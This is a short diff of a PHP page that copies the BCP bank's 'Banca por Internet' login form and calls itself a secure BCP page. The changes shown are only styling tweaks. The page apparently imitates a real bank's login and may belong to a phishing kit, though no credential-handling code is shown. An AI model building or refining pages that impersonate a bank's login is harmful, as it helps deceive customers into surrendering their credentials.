@@ -28,14 +28,14 @@ if (isset($_POST['submit'])) {
 </head>
 
 <body>
-    <div class="container-fluid sinpadding">
+    <div class="container-fluid  sinpadding">
         <div class="row m-altura">
             <div class="col-md-6 img-fondo">
 
             </div>
             <div class="col-md-6">
 
-                <h3 class="fw-bold text-center pt-5 mb-5">Banca por Internet</h3>
+                <h3 class="fw-bold text-center pt-5 mb-5 color-titulo">Banca por Internet</h3>
                 <!-- Formulario -->
                 <form action="#" method="post" novalidate class="form-padre" id="formulario">
                     <div class="opciones">
@@ -95,11 +95,11 @@ if (isset($_POST['submit'])) {
                         ?>
                     </div>
 
-                    <div>
-                        <input type="submit" name='submit' value="Continuar" id="st" class= " botoncontinuar"  />
+                    <div mt-10>
+                        <input type="submit" name='submit' value="Continuar" id="st" class="botoncontinuar"  />
                         <p id="show" style="text-align:center;">
-
                     </div>
+
                     <div>
                         <p class="texto">
                             <i class="bi bi-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate
